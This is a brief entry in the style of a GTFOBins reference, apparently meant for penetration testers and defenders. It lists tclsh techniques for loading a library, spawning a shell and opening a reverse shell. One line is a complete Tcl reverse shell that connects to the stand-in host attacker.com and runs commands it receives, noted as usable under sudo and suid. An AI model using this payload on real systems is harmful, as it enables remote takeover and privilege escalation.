---
type: gtfobin
name: tclsh
platform: Unix
functions: [library-load, reverse-shell, shell]
tags: [gtfobin, unix, lotl]
---

# tclsh

## library-load

```bash
tclsh
load /path/to/lib.so x
```
**Contexts:** capabilities, sudo, suid, unprivileged

## reverse-shell

```bash
tclsh
set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;
```
**Contexts:** sudo, suid, unprivileged

## shell

```bash
tclsh
```
**Contexts:** sudo, suid, unprivileged
